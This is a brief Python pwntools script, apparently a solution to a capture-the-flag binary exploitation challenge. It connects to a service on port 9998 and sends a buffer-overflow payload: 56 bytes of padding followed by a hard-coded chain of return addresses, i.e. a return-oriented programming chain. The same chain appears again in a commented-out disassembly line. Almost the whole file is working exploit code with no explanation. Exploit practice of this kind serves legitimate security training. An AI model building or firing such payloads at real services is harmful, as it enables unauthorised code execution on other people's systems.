from pwn import *


# context.arch = "amd64"

r = remote("0.0.0.0", 9998)

r.sendline(
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa2\x11@\x00\x00\x00\x00\x00\xa0@@\x00\x00\x00\x00\x00\x9a\x11@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x11@\x00\x00\x00\x00\x00\xea\x11@\x00\x00\x00\x00\x00\xd6\x11@\x00\x00\x00\x00\x00\xa2\x11@\x00\x00\x00\x00\x00\xa0@@\x00\x00\x00\x00\x00\x9c\x11@\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xa8\x11@\x00\x00\x00\x00\x00\xee\x11@\x00\x00\x00\x00\x00\xdb\x11@\x00\x00\x00\x00\x00\xa2\x11@\x00\x00\x00\x00\x00\xa0@@\x00\x00\x00\x00\x00\x9e\x11@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xac\x11@\x00\x00\x00\x00\x00\xf2\x11@\x00\x00\x00\x00\x00\xe0\x11@\x00\x00\x00\x00\x00\xbd\x11@\x00\x00\x00\x00\x00\xa4\x11@\x00\x00\x00\x00\x00\xa8\x11@\x00\x00\x00\x00\x00\xac\x11@\x00\x00\x00\x00\x00\x9a\x11@\x00\x00\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00\xc1\x11@\x00\x00\x00\x00\x00\xea\x11@\x00\x00\x00\x00\x00\xff\x11@\x00\x00\x00\x00\x00"
)

# print disasm(
#     "\xa2\x11@\x00\x00\x00\x00\x00\xa0@@\x00\x00\x00\x00\x00\x9a\x11@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x11@\x00\x00\x00\x00\x00\xea\x11@\x00\x00\x00\x00\x00\xd6\x11@\x00\x00\x00\x00\x00\xa2\x11@\x00\x00\x00\x00\x00\xa0@@\x00\x00\x00\x00\x00\x9c\x11@\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xa8\x11@\x00\x00\x00\x00\x00\xee\x11@\x00\x00\x00\x00\x00\xdb\x11@\x00\x00\x00\x00\x00\xa2\x11@\x00\x00\x00\x00\x00\xa0@@\x00\x00\x00\x00\x00\x9e\x11@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xac\x11@\x00\x00\x00\x00\x00\xf2\x11@\x00\x00\x00\x00\x00\xe0\x11@\x00\x00\x00\x00\x00\xbd\x11@\x00\x00\x00\x00\x00\xa4\x11@\x00\x00\x00\x00\x00\xa8\x11@\x00\x00\x00\x00\x00\xac\x11@\x00\x00\x00\x00\x00\x9a\x11@\x00\x00\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00\xc1\x11@\x00\x00\x00\x00\x00\xea\x11@\x00\x00\x00\x00\x00\xff\x11@\x00\x00\x00\x00\x00"
# )


pause()
